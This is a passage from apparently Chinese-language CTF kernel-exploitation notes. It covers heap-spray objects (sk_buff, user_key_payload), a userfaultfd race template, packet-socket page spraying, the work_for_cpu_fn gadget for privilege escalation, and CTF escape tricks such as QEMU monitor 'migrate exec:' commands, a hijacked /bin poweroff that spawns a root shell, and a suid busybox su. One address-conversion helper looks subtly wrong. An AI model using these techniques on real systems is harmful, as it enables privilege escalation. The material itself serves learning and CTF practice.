src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/U8CjYMBOcZ74s3W.png" alt=""></p><p>在内核网络协议栈中很多地方都会用到该结构体，例如读写 socket 一类的操作都会造成包的创建，其最终都会调用到 <code>alloc_skb()</code> 来分配该结构体，而这个函数又是 <code>__alloc_skb()</code> 的 wrapper，不过需要注意的是其会从<strong>独立的</strong> <code>skbuff_fclone_cache</code>/ <code>skbuff_head_cache</code> 取 object</p><p><code>sk_buff</code> 虽然是从独立的 kmem_cache 中分配的，<strong>但其对应的数据包不是</strong></p><p>因此我们仍然可以实现近乎任意大小 object 的分配与释放</p><p>因此 <code>sk_buff</code> 与 <code>msg_msg</code> 一样常被用来完成堆喷的工作，不同的是 <code>msg_msg</code> 带了一个 header，而 <code>sk_buff</code> 的数据包则带一个 tail——<code>skb_shared_info</code> 结构体</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-02_213558.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> &#123;</span></span><br><span class="line">__u8flags;</span><br><span class="line">__u8meta_len;</span><br><span class="line">__u8nr_frags;</span><br><span class="line">__u8tx_flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_size;</span><br><span class="line"><span class="comment">/* Warning: this field is not always filled in (UFO)! */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_segs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">frag_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_hwtstamps</span> <span class="title">hwtstamps</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>gso_type;</span><br><span class="line">u32tskey;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Warning : all fields before dataref are cleared in __alloc_skb()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span>dataref;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Intermediate layers must ensure that destructor_arg</span></span><br><span class="line"><span class="comment"> * remains valid until skb destructor */</span></span><br><span class="line"><span class="type">void</span> *destructor_arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must be last field, see pskb_expand_head() */</span></span><br><span class="line"><span class="type">skb_frag_t</span>frags[MAX_SKB_FRAGS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>skb_shared_info</code> 结构体的<strong>大小为 320 字节，这意味着我们能够利用分配的 object 最小的大小也得是 512 字节，这无疑为我们的利用增添了几分难度</strong>，但不可否认的是 <code>sk_buff</code> 仍为我们提供了较大对象的任意分配写入与释放</p><p>正所谓有发必有收，我们只需要沿着发送的路径接收该包就能将其释放掉，例如若是我们通过向套接字中写入数据创建了一个包，则从套接字中读出该包便能将其释放</p><h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p><strong>申请obj大小:任意</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:泄露.text|泄露直接映射区地址</strong></p><p>在linux内核中有一套专门用于管理密钥的子系统,负责密钥的创建,读取,更新以及销毁等功能</p><p>内核提供了两个系统调用来负责这些操作</p><p><code>add_key()</code>和<code>keyctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">        <span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">                                    <span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br></pre></td></tr></table></figure><p>当调用<code>add_key()</code>创建带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时</p><ul><li>首先会在内核空间中分配 obj 1 与 obj2，分配 flag 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> (字符串，最大大小为 4096)、<code>payload</code> (普通数据，大小无限制)</li><li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存 <code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li><li>释放 obj1 与 obj2，返回密钥 id</li></ul><p>其中 obj4 为一个 <code>user_key_payload</code> 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span>        data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>由于decription和payload的长度都是可控的,那么<code>obj1-4</code>的大小其实也是可控的</p><p>类似于 <code>msg_msg</code>，<code>user_key_payload</code> 结构体有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）。</p><p><code>keyctl()</code> 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 <code>user_key_payload-&gt;datalen</code> 决定</p><p>读取 key 时的 len 应当<strong>不小于 user_key_payload-&gt;datalen，否则会读取失败</strong>,但是可以大于datalen。</p><p>当释放一个密钥时</p><p>内核中，对应的处理流程是<code>_x64_sys_keyctl() -&gt; keyctl_revoke_key() -&gt; key_revoke() -&gt; user_revoke() -&gt; call_rcu()</code>，在<code>call_rcu()</code>函数中将 <code>user_key_payload</code> 结构体的 <code>rcu.func</code> 设置成<code>user_free_payload_rcu()</code>函数的地址</p><h2 id="io-uring"><a href="#io-uring" class="headerlink" title="io_uring"></a>io_uring</h2><p><strong>申请obj大小:任意</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:泄露.text|泄露直接映射区地址</strong></p><p>io_uring是自内核版本 5.1 引入的全新的高性能异步 I/O 框架,</p><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="userfaultfd-1"><a href="#userfaultfd-1" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>userfaultfd配合copy_from_user或者copy_to_user在条件竞争中有着十分强大的作用</p><p>其作用就是监控在某一段内存中发生的页错误,并且可以由用户指定如何处理</p><p>一般情况下我们选择使用sleep()或者pause()等函数使该线程停下,这样让我们完成条件竞争构造uaf等,提供了十分便利的条件</p><p>不过在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p><p>一个模板:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_stuck_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="comment">//这部分是缺页异常处理得到的页的内容填充</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pgv页级分配"><a href="#pgv页级分配" class="headerlink" title="pgv页级分配"></a>pgv页级分配</h2><h2 id="setsockopt"><a href="#setsockopt" class="headerlink" title="setsockopt"></a>setsockopt</h2><p>当创建一个协议为<code>PF_PACKET</code>的socket时,如下</p><p><code>socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</code></p><p>如果再先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code>或者<code>TPACKET_V2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> version = TPACKET_V1;</span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br></pre></td></tr></table></figure><p>那么之后当我们创建如下这样一个结构体时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再调用<code>PACKET_TX_RING</code>或者<code>PACKET_RX_RING</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line">req.tp_block_size = size;</span><br><span class="line">req.tp_block_nr = nr;</span><br><span class="line">req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br></pre></td></tr></table></figure><p>之后便会分配<code>tp_frame_nr</code>个页框,并且是直接从伙伴系统中提取</p><p>并且当关闭socket时,会将这些页框释放</p><p>最后需要注意的是</p><blockquote><p>需要注意的是低权限用户无法创建一个类型为 <code>SOCK_RAW</code> 协议为 <code>PF_PACKET</code> 的 socket，但是我们可以通过开辟新的命名空间来绕过该限制，不过这样也有一定的缺陷：我们的进程也被隔离到该进程里了，无法获得“真正的 root 权限”</p><p>因此我们最好的做法便是开辟一个子进程，在该子进程中开辟新命名空间专门进行堆喷，父进程/其他子进程用于提权，通过管道与该子进程进行交互</p></blockquote><h2 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h2><h1 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h1><h2 id="work-for-cpu-fn"><a href="#work-for-cpu-fn" class="headerlink" title="work_for_cpu_fn"></a>work_for_cpu_fn</h2><p>一个十分神奇的gadget</p><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line"><span class="type">void</span> *arg;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其会有如下调用</p><p><code>*(arg+0x30)=*(arg+0x20)(*(arg+0x28))</code></p><p>也就是说这个函数不经能够劫持实现任意函数调用,同时还能存储返回值(nb嘞)</p><blockquote><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。（如果还需要禁用 SELinux 之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）</p></blockquote><h1 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h1><h2 id="QEMU逃逸"><a href="#QEMU逃逸" class="headerlink" title="QEMU逃逸"></a>QEMU逃逸</h2><p>当qemu启动脚本中没有重定向monitor时，可以直接ctrl+A C逃逸，解压rootfs.img读flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">migrate <span class="string">&quot;exec:cp rootfs.img /tmp &quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cd /tmp;zcat rootfs.img | cpio -idmv 1&gt;&amp;2&quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">(qemu) migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">flag&#123;test_flag&#125;qemu-system-x86_64: failed to save SaveStateEntry with <span class="built_in">id</span>(name):)</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zcat rootfs.cpio | cpio -idmv 1&gt;&amp;2</span><br></pre></td></tr></table></figure><h2 id="bin目录不为ROOT"><a href="#bin目录不为ROOT" class="headerlink" title="bin目录不为ROOT"></a>bin目录不为ROOT</h2><p>这样可以修改bin里面的命令，而init脚本在退出时，通常包含poweroff命令，或者umount命令，而init运行时是以root权限运行的，所以我们可以修改这些命令从而在输入exit命令调用init中在setsid剩下的命令时来直接cat flag或者获得shell</p><h2 id="根目录不为ROOT"><a href="#根目录不为ROOT" class="headerlink" title="根目录不为ROOT"></a>根目录不为ROOT</h2><p>那么在根目录下，虽然bin的所有者为root，但是可以对bin进行改名，然后我们伪造一个bin目录，里面放上我们伪造的命令，那么就可以以root权限调用这个伪造的命令了，如下为所示例子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> bin evil_bin</span><br><span class="line">/evil_bin/mkdir bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/evil_bin/sh&quot;</span> &gt; /bin/power</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/evil_bin/sh&quot;</span> &gt;&gt; /bin/power</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="密码设置"><a href="#密码设置" class="headerlink" title="密码设置"></a>密码设置</h2><p>如果root账号的密码没有设置的话，直接su即可登录到root，非预期的。</p><p>又或者是默认的密码<code>#</code>,当然其实很多内核并没有提供su</p><p>例如linectf2022-encrypt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">First, connect via netcat.</span><br><span class="line">We got a shell, let&#x27;s look around:</span><br><span class="line">/ $ ls</span><br><span class="line">=&gt; We see the flag file.</span><br><span class="line">/ $ cat flag</span><br><span class="line">=&gt; Not enough permissions.</span><br><span class="line">Are there many other users?</span><br><span class="line">/ $ cat /etc/passwd</span><br><span class="line">=&gt; Only root seems to be available. Let&#x27;s try switching to it:</span><br><span class="line">/ $ su</span><br><span class="line">/ #</span><br><span class="line">=&gt; See the #? This worked! We got root!</span><br><span class="line">/ # cat flag</span><br></pre></td></tr></table></figure><h2 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h2><p>带有suid的可执行文件允许我们拥有文件所有者的权限</p><p>还是lincectf2022的encrypt</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>打印的字符串告诉我们busybox具有这个权限位</p><p>Run busybox and it will show us all the configurations which are avialable</p><p>发现其中具有su于是</p><p><code>busybox su root</code></p><h1 id="linux支持"><a href="#linux支持" class="headerlink" title="linux支持"></a>linux支持</h1><h2 id="direct-map-addr-to-from-page-addr"><a href="#direct-map-addr-to-from-page-addr" class="headerlink" title="direct_map_addr_to/from_page_addr"></a>direct_map_addr_to/from_page_addr</h2><p>直接映射区的虚拟地址可以通过线性对应关系与vmemmap段的page结构相互转化</p><p>而每一个page结构体又对应着唯一一个PGN</p><p>又因为直接映射区上的地址减去<code>page_offset_base</code>就是物理内存地址,所以这些之间存在直观的直接线性关系</p><p>关系如下</p><p><strong>direct_map_addr_to_page_addr</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>page_addr_to_direct_map_addr</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">page_addr_to_direct_map_addr</span><span class="params">(<span class="type">size_t</span> vmem_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((vmem_map_addr &amp; (~<span class="number">0x40</span>)) - vmemmap_base) / <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> direct_map_addr + page_count * <span class="number">0x1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="setreuid-setregid"><a href="#setreuid-setregid" class="headerlink" 